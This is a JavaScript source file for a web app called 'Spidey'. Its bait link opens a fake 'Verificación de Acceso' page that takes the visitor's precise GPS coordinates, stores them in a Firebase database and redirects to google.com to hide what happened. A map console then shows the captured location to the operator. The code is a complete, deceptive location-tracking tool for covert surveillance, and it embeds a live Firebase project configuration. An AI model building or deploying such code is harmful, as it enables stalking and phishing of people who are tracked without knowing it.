import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

// CONFIGURACIÓN DE FIREBASE
const firebaseConfig = {
    apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
    authDomain: "spideytracker-591bb.firebaseapp.com",
    projectId: "spideytracker-591bb",
    storageBucket: "spideytracker-591bb.firebasestorage.app",
    messagingSenderId: "923704989530",
    appId: "1:923704989530:web:74debc7597acbc80a00563"
};

// Inicializar Firebase, Firestore y Auth
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

let map;
let spiderMarker = null;
let ubicacionObjetivo = null; 
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Icono personalizado de araña
const spiderIcon = L.divIcon({
    html: '<div style="font-size: 32px; line-height: 1; text-align: center;">🕷️</div>',
    className: 'spider-marker',
    iconSize: [36, 36],
    iconAnchor: [18, 18]
});

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", async function () {
    // ESCENARIO A: Dispositivo secundario (Target)
    if (targetId) {
        document.body.innerHTML = `
            <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background:#121212; color:white; font-family:sans-serif; text-align:center; padding:20px;">
                <h2 style="margin-bottom:20px;">Verificación de Acceso</h2>
                <button id="btn-capturar" style="padding: 15px 30px; font-size: 18px; background-color: #d9534f; color: white; border: none; border-radius: 8px; cursor: pointer;">
                    Continuar
                </button>
            </div>
        `;

        const btn = document.getElementById('btn-capturar');
        if (btn) {
            btn.onclick = async () => {
                btn.innerText = "Procesando...";
                btn.disabled = true;

                try {
                    // 1. Esperar obligatoriamente la autenticación anónima
                    await signInAnonymously(auth);
                    // 2. Pedir coordenadas y esperar confirmación de guardado en Firestore
                    await capturarYSalir(targetId);
                } catch (err) {
                    alert("Error de conexión o autenticación: " + err.message);
                    btn.innerText = "Reintentar";
                    btn.disabled = false;
                }
            };
        }
        return;
    }

    // ESCENARIO B: Consola Principal
    try {
        await signInAnonymously(auth);
        console.log("Sesión segura iniciada.");
    } catch (error) {
        console.error("Error al autenticar en Firebase Auth:", error);
    }

    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Escuchar la base de datos en tiempo real
    escucharObjetivoRemoto("objetivo_principal");
});

// CAPTURA Y GUARDADO DE UBICACIÓN
function capturarYSalir(id) {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            alert("Tu navegador no soporta geolocalización.");
            window.location.replace("https://www.google.com");
            return resolve();
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                try {
                    // Esperar escritura en Firestore antes de redirigir
                    await setDoc(doc(db, "rastreos", id), {
                        lat: lat,
                        lng: lng,
                        timestamp: new Date().toISOString()
                    });
                } catch (e) {
                    alert("Error guardando en la base de datos: " + e.message);
                } finally {
                    // Redirigir solo cuando Firestore haya confirmado
                    window.location.replace("https://www.google.com");
                    resolve();
                }
            },
            (error) => {
                alert("Error obteniendo ubicación (" + error.code + "): " + error.message);
                window.location.replace("https://www.google.com");
                resolve();
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// ESCUCHAR DATOS EN TIEMPO REAL
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            ubicacionObjetivo = [data.lat, data.lng];

            if (!spiderMarker) {
                spiderMarker = L.marker(ubicacionObjetivo, { icon: spiderIcon }).addTo(map);
            } else {
                spiderMarker.setLatLng(ubicacionObjetivo);
            }

            const googleMapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
            
            spiderMarker.bindPopup(`
                <div style="text-align:center;">
                    <b>🕷️ PUNTO DETECTADO</b><br>
                    Lat: ${data.lat.toFixed(5)}<br>
                    Lng: ${data.lng.toFixed(5)}<br><br>
                    <a href="${googleMapsUrl}" target="_blank" style="color: #d9534f; font-weight: bold;">Abrir en Google Maps 📍</a>
                </div>
            `);

            const banner = document.getElementById('banner-status');
            if (banner) {
                banner.innerHTML = "¡SEÑAL DETECTADA!<br>NODO SPIDEY ENLACE OK";
            }

            irAlPuntoDeAcceso();
        }
    });
}

// FUNCIONALIDADES DE LA INTERFAZ (EXPUESTAS A WINDOW)
function irAlPuntoDeAcceso() {
    if (ubicacionObjetivo) {
        map.invalidateSize();
        map.setView(ubicacionObjetivo, 18, { animate: true, duration: 1.5 });
        if (spiderMarker) {
            spiderMarker.openPopup();
        }
    }
}

window.accionRastrearObjetivo = function() {
    if (ubicacionObjetivo) {
        irAlPuntoDeAcceso();
    } else {
        alert("Aún no hay coordenadas recibidas.");
    }
};

window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("Enlace copiado correctamente.");
    });
};

window.obtenerUbicacionActual = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            L.marker([lat, lng]).addTo(map).bindPopup("Tu ubicación actual").openPopup();
        });
    }
};

window.centrarUbicacion = () => irAlPuntoDeAcceso();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat abierto.");
window.verArchivo = () => alert("Abriendo registros...");
